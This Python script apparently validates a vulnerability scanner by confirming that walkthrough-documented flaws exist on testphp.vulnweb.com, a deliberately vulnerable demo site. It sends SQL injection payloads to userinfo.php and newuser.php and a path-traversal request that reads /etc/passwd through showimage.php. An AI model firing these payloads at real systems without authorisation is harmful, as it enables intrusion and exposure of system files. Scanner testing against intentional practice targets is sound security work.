#!/usr/bin/env python3
"""
Simple verification script to confirm walkthrough vulnerabilities exist.
This tests the exact vulnerabilities mentioned in walkthrough guides.
"""

import requests
import sys

def test_userinfo_sqli():
    """Test POST SQLi on userinfo.php uname parameter"""
    print("🔍 Testing userinfo.php POST SQLi...")

    try:
        # Basic SQL injection payload
        data = {'uname': "' OR '1'='1'-- "}
        response = requests.post("http://testphp.vulnweb.com/userinfo.php", data=data, timeout=10)

        if any(error in response.text.lower() for error in ['mysql', 'sql syntax', 'warning:', 'error']):
            print("✅ CONFIRMED: userinfo.php POST SQLi vulnerability exists")
            print(f"   Response contains SQL error indicators")
            return True
        else:
            print("❌ MISSING: userinfo.php POST SQLi not detected")
            return False

    except Exception as e:
        print(f"❌ ERROR testing userinfo.php: {e}")
        return False

def test_newuser_sqli():
    """Test POST SQLi on newuser.php uuname parameter"""
    print("🔍 Testing newuser.php POST SQLi...")

    try:
        # Basic SQL injection payload
        data = {'uuname': "' OR '1'='1'-- "}
        response = requests.post("http://testphp.vulnweb.com/secured/newuser.php", data=data, timeout=10)

        if any(error in response.text.lower() for error in ['mysql', 'sql syntax', 'warning:', 'error']):
            print("✅ CONFIRMED: newuser.php POST SQLi vulnerability exists")
            print(f"   Response contains SQL error indicators")
            return True
        else:
            print("❌ MISSING: newuser.php POST SQLi not detected")
            return False

    except Exception as e:
        print(f"❌ ERROR testing newuser.php: {e}")
        return False

def test_showimage_lfi():
    """Test LFI on showimage.php file parameter"""
    print("🔍 Testing showimage.php LFI...")

    try:
        # Basic LFI payload
        response = requests.get("http://testphp.vulnweb.com/showimage.php?file=../../../etc/passwd", timeout=10)

        if 'root:x:0:0:' in response.text or 'daemon:' in response.text:
            print("✅ CONFIRMED: showimage.php LFI vulnerability exists")
            print(f"   Successfully read /etc/passwd")
            return True
        else:
            print("❌ MISSING: showimage.php LFI not detected")
            return False

    except Exception as e:
        print(f"❌ ERROR testing showimage.php: {e}")
        return False

def main():
    print("=" * 60)
    print("🎯 WALKTHROUGH VULNERABILITY VERIFICATION")
    print("=" * 60)

    results = []
    results.append(test_userinfo_sqli())
    results.append(test_newuser_sqli())
    results.append(test_showimage_lfi())

    print("\n" + "=" * 60)
    print("📊 RESULTS SUMMARY")
    print("=" * 60)

    confirmed = sum(results)
    total = len(results)

    print(f"✅ Confirmed vulnerabilities: {confirmed}/{total}")

    if confirmed == total:
        print("🎉 ALL walkthrough vulnerabilities confirmed - scanner should find these!")
    else:
        print("🚨 Some vulnerabilities not responding - possible network/server issues")

    return confirmed == total

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)